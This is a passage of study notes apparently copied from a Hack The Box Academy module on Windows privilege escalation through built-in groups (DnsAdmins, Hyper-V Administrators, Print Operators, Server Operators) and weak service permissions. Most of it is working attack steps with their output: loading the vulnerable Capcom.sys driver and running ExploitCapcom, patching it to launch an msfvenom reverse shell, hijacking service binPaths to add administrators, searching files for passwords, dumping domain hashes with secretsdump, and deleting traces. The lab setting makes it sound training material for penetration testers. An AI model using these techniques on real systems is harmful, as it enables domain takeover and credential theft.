        FLAGS              :</code></pre></div><h4 id=confirming-group-membership-1>Confirming Group Membership</h4><p>If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net group &#34;Domain Admins&#34; /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.</code></pre></div><hr><h2 id=cleaning-up>Cleaning Up</h2><p>Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.</p><p>These steps must be taken from an elevated console with a local or domain admin account.</p><h4 id=confirming-registry-key-added>Confirming Registry Key Added</h4><p>The first step is confirming that the <code>ServerLevelPluginDll</code> registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll</code></pre></div><h4 id=deleting-registry-key>Deleting Registry Key</h4><p>We can use the <code>reg delete</code> command to remove the key that points to our custom DLL.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.</code></pre></div><h4 id=starting-the-dns-service-again>Starting the DNS Service Again</h4><p>Once this is done, we can start up the DNS service again.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :</code></pre></div><h4 id=checking-dns-service-status>Checking DNS Service Status</h4><p>If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an <code>nslookup</code> against the localhost or another host in the domain.</p><p>DnsAdmins</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=hyper-v-administrators>Hyper-V Administrators</h1><hr><p>The <a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators rel=external>Hyper-V Administrators</a> group has full access to all <a href=https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines rel=external>Hyper-V features</a>. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.</p><p>It is also well documented on this <a href=https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/ rel=external>blog</a>, that upon deleting a virtual machine, <code>vmms.exe</code> attempts to restore the original file permissions on the corresponding <code>.vhdx</code> file and does so as <code>NT AUTHORITY\SYSTEM</code>, without impersonating the user. We can delete the <code>.vhdx</code> file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.</p><p>If the operating system is vulnerable to <a href=https://www.tenable.com/cve/CVE-2018-0952 rel=external>CVE-2018-0952</a> or <a href=https://www.tenable.com/cve/CVE-2019-0841 rel=external>CVE-2019-0841</a>, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.</p><h4 id=target-file>Target File</h4><p>An example of this is Firefox, which installs the <code>Mozilla Maintenance Service</code>. We can update <a href=https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1 rel=external>this exploit</a> (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:</p><p>Hyper-V Administrators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
</span></span></code></pre></div><h4 id=taking-ownership-of-the-file>Taking Ownership of the File</h4><p>After running the PowerShell script, we should have full control of this file and can take ownership of it.</p><p>Hyper-V Administrators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe</code></pre></div><h4 id=starting-the-mozilla-maintenance-service>Starting the Mozilla Maintenance Service</h4><p>Next, we can replace this file with a malicious <code>maintenanceservice.exe</code>, start the maintenance service, and get command execution as SYSTEM.</p><p>Hyper-V Administrators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc.exe start MozillaMaintenance</code></pre></div><p>Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.</p><p><a href=https://academy.hackthebox.com/module/67/section/603 rel=external>Previous</a></p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=print-operators>Print Operators</h1><hr><p><a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators rel=external>Print Operators</a> is another highly privileged group, which grants its members the <code>SeLoadDriverPrivilege</code>, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command <code>whoami /priv</code>, and don&rsquo;t see the <code>SeLoadDriverPrivilege</code> from an unelevated context, we will need to bypass UAC.</p><h4 id=confirming-privileges>Confirming Privileges</h4><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled</code></pre></div><h4 id=checking-privileges-again>Checking Privileges Again</h4><p>The <a href=https://github.com/hfiref0x/UACME rel=external>UACMe</a> repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, <code>SeLoadDriverPrivilege</code> is visible but disabled.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre></div><p>It&rsquo;s well known that the driver <code>Capcom.sys</code> contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use <a href=https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp rel=external>this</a> tool to load the driver. The PoC enables the privilege as well as loads the driver for us.</p><p>Download it locally and edit it, pasting over the includes below.</p><p>Code: c</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;winternl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sddl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;tchar.h&#34;</span></span></span></code></pre></div><p>Next, from a Visual Studio 2019 Developer Command Prompt, compile it using <strong>cl.exe</strong>.</p><h4 id=compile-with-clexe>Compile with cl.exe</h4><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\Users\mrb3n\Desktop\Print Operators&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj</code></pre></div><h4 id=add-reference-to-driver>Add Reference to Driver</h4><p>Next, download the <code>Capcom.sys</code> driver from <a href=https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys rel=external>here</a>, and save it to <code>C:\temp</code>. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d &#34;\??\C:\Tools\Capcom.sys&#34;

The operation completed successfully.


C:\local&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.</code></pre></div><p>The odd syntax <code>\??\</code> used to reference our malicious driver&rsquo;s ImagePath is an <a href=https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c rel=external>NT Object Path</a>. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.</p><h4 id=verify-driver-is-not-loaded>Verify Driver is not Loaded</h4><p>Using Nirsoft&rsquo;s <a href=http://www.nirsoft.net/utils/driverview.html rel=external>DriverView.exe</a>, we can verify that the Capcom.sys driver is not loaded.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\DriverView.exe /stext drivers.txt
PS C:\local&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre></div><h4 id=verify-privilege-is-enabled>Verify Privilege is Enabled</h4><p>Run the <code>EnableSeLoadDriverPrivilege.exe</code> binary.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0</code></pre></div><h4 id=verify-capcom-driver-is-listed>Verify Capcom Driver is Listed</h4><p>Next, verify that the Capcom driver is now listed.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\DriverView.exe /stext drivers.txt
PS C:\local&gt; cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys</code></pre></div><h4 id=use-exploitcapcom-tool-to-escalate-privileges>Use ExploitCapcom Tool to Escalate Privileges</h4><p>To exploit the Capcom.sys, we can use the <a href=https://github.com/tandasat/ExploitCapcom rel=external>ExploitCapcom</a> tool after compiling with it Visual Studio.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched</code></pre></div><p>This launches a shell with SYSTEM privileges.</p><p><a href=#R-image-4d03ed57de0f8f2f725893e12cc7d2dd class=lightbox-link><img alt="Command prompt running as NT AUTHORITYYSTEM. PowerShell shows Capcom.sys driver identified and ExploitCapcom.exe executed, resulting in successful token stealing and SYSTEM shell launch." class="lazy lightbox figure-image" loading=lazy src=../../resources/capcomexploit.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-4d03ed57de0f8f2f725893e12cc7d2dd><img alt="Command prompt running as NT AUTHORITYYSTEM. PowerShell shows Capcom.sys driver identified and ExploitCapcom.exe executed, resulting in successful token stealing and SYSTEM shell launch." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/capcomexploit.png></a></p><hr><h2 id=alternate-exploitation---no-gui>Alternate Exploitation - No GUI</h2><p>If we do not have GUI access to the target, we will have to modify the <code>ExploitCapcom.cpp</code> code before compiling. Here we can edit line 292 and replace <code>"C:\\Windows\\system32\\cmd.exe"</code> with, say, a reverse shell binary created with <code>msfvenom</code>, for example: <code>c:\ProgramData\revshell.exe</code>.</p><p>Code: c</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// Launches a command shell process
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>bool</span> <span style=color:#a6e22e>LaunchShell</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    TCHAR CommandLine[] <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>system32</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>cmd.exe&#34;</span>);
</span></span><span style=display:flex><span>    PROCESS_INFORMATION ProcessInfo;
</span></span><span style=display:flex><span>    STARTUPINFO StartupInfo <span style=color:#f92672>=</span> { <span style=color:#66d9ef>sizeof</span>(StartupInfo) };
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>CreateProcess</span>(CommandLine, CommandLine, nullptr, nullptr, FALSE,
</span></span><span style=display:flex><span>        CREATE_NEW_CONSOLE, nullptr, nullptr, <span style=color:#f92672>&amp;</span>StartupInfo,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>ProcessInfo))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> false;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(ProcessInfo.hThread);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(ProcessInfo.hProcess);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> true;
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>The <code>CommandLine</code> string in this example would be changed to:</p><p>Code: c</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  TCHAR CommandLine[] <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>ProgramData</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>revshell.exe&#34;</span>);</span></span></code></pre></div><p>We would set up a listener based on the <code>msfvenom</code> payload we generated and hopefully receive a reverse shell connection back when executing <code>ExploitCapcom.exe</code>. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.</p><hr><h2 id=automating-the-steps>Automating the Steps</h2><h4 id=automating-with-eoploaddriver>Automating with EopLoadDriver</h4><p>We can use a tool such as <a href=https://github.com/TarlogicSecurity/EoPLoadDriver/ rel=external>EoPLoadDriver</a> to automate the process of enabling the privilege, creating the registry key, and executing <code>NTLoadDriver</code> to load the driver. To do this, we would run the following:</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0</code></pre></div><p>We would then run <code>ExploitCapcom.exe</code> to pop a SYSTEM shell or run our custom binary.</p><hr><h2 id=clean-up>Clean-up</h2><h4 id=removing-registry-key>Removing Registry Key</h4><p>We can cover our tracks a bit by deleting the registry key added earlier.</p><p>Print Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.</code></pre></div><p>Note: Since Windows 10 Version 1803, the &ldquo;SeLoadDriverPrivil</p><p>Â </p><p>Â </p><p>Â </p><h1 id=server-operators>Server Operators</h1><hr><p>The <a href=https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators rel=external>Server Operators</a> group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.</p><p>Membership of this group confers the powerful <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> privileges and the ability to control local services.</p><h4 id=querying-the-appreadiness-service>Querying the AppReadiness Service</h4><p>Let&rsquo;s examine the <code>AppReadiness</code> service. We can confirm that this service starts as SYSTEM using the <code>sc.exe</code> utility.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</code></pre></div><h4 id=checking-service-permissions-with-psservice>Checking Service Permissions with PsService</h4><p>We can use the service viewer/controller <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psservice rel=external>PsService</a>, which is part of the Sysinternals suite, to check permissions on the service. <code>PsService</code> works much like the <code>sc</code> utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All</code></pre></div><p>This confirms that the Server Operators group has <a href=https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights rel=external>SERVICE_ALL_ACCESS</a> access right, which gives us full control over this service.</p><h4 id=checking-local-admin-group-membership>Checking Local Admin Group Membership</h4><p>Let&rsquo;s take a look at the current members of the local administrators group and confirm that our target account is not present.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.</code></pre></div><h4 id=modifying-the-service-binary-path>Modifying the Service Binary Path</h4><p>Let&rsquo;s change the binary path to execute a command which adds our current user to the default local administrators group.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc config AppReadiness binPath= &#34;cmd /c net localgroup Administrators server_adm /add&#34;

[SC] ChangeServiceConfig SUCCESS</code></pre></div><h4 id=starting-the-service>Starting the Service</h4><p>Starting the service fails, which is expected.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</code></pre></div><h4 id=confirming-local-admin-group-membership>Confirming Local Admin Group Membership</h4><p>If we check the membership of the administrators group, we see that the command was executed successfully.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.</code></pre></div><h4 id=confirming-local-admin-access-on-domain-controller>Confirming Local Admin Access on Domain Controller</h4><p>From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.</p><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ crackmapexec smb 10.129.43.9 -u server_adm -p &#39;local_@cademy_stdnt!&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:local_@cademy_stdnt! (Pwn3d!)
</span></span></code></pre></div><h4 id=retrieving-ntlm-password-hashes-from-the-domain-controller>Retrieving NTLM Password Hashes from the Domain Controller</h4><p>Server Operators</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span><span style=display:flex><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
</span></span><span style=display:flex><span>[*] Kerberos keys grabbed
</span></span><span style=display:flex><span>Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
</span></span><span style=display:flex><span>Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
</span></span><span style=display:flex><span>Administrator:des-cbc-md5:d60dfbbf20548938
</span></span><span style=display:flex><span>[*] Cleaning up...
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â credential hunting</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>findstr /SIM /C:&#34;pass&#34; *.ini *.cfg *.config *.xml</code></pre></div><p>Â </p><p>IF u get a netwrok or sservice local account can escalate and get seimpersonate priv</p><p><a href=https://github.com/itm4n/FullPowers rel=external>https://github.com/itm4n/FullPowers</a></p><p>Â </p><h1 id=weak-permissions-service-binary-hijacking>Weak Permissions-SERVICE BINARY HIJACKING</h1><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : &#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;
  
  &lt;SNIP&gt;</code></pre></div><p>Â </p><p>Â </p><h4 id=checking-permissions-with-icacls>Checking Permissions with icacls</h4><p>Using <a href=https://ss64.com/nt/icacls.html rel=external>icacls</a> we can verify the vulnerability and see that the <code>EVERYONE</code> and <code>BUILTIN\Users</code> groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; icacls &#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files</code></pre></div><p>Â </p><p>Â </p><h4 id=replacing-service-binary>Replacing Service Binary</h4><p>This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with <code>msfvenom</code>. It can give us a reverse shell as <code>SYSTEM</code>, or add a local admin user and give us full administrative control over the machine.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; cmd /c copy /Y SecurityService.exe &#34;C:\Program Files (x86)\PCProtect\SecurityService.exe&#34;
C:\local&gt; sc start SecurityService</code></pre></div><p>Â </p><p>Â </p><h2 id=weak-service-permissions>Weak Service Permissions</h2><p>Â </p><h4 id=reviewing-sharpup-again>Reviewing SharpUp Again</h4><p>Let&rsquo;s check the <code>SharpUp</code> output again for any modifiable services. We see the <code>WindscribeService</code> is potentially misconfigured.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
